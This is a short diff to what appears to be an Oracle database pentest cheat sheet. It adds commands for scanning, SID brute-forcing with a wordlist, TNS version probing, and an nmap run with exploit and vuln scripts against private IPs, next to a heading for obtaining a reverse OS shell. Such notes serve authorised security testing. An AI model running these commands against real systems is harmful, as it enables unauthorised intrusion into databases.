@@ -18,11 +18,15 @@ SELECT OWNER, TABLE_NAME FROM ALL_TABLES ORDER BY TABLE_NAME;
 
 tools
 odat
-oscanner
 tnscmd10g
 opwg
 sqlplus
 	sqlplus user/pass@127.0.0.1
+oscanner -s 192.168.1.111 -P 1040	
+sidguess -i 192.168.1.111 -d /usr/share/wordlists/metasploit/unix_users.txt
+tnscmd10g version -h 192.168.1.111
+nmap -p 1521 -A -T4 -v --script default,exploit,vuln,safe,version,auth 192.168.15.111
+
 
 Get Oracle Reverse os-shell:
 begin
